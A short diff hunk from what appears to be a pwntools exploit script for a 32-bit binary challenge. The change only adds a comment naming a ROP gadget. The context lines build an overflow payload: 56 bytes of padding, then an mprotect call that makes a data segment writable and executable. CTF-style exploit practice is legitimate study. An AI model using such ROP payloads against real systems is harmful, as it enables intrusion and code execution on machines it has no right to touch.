@@ -9,7 +9,7 @@ context.log_level = 'debug'
 
 mprotect = e.symbols['mprotect']
 buf = 0x80ea000  # vmmap看的data段
-pop_3_ret = 0x0804f460
+pop_3_ret = 0x0804f460 # pop esi; pop edi; pop ebp; ret
 read = e.symbols['read']
 
 payload1 = flat('a' * 56, mprotect, pop_3_ret, buf, 0x1000, 7)
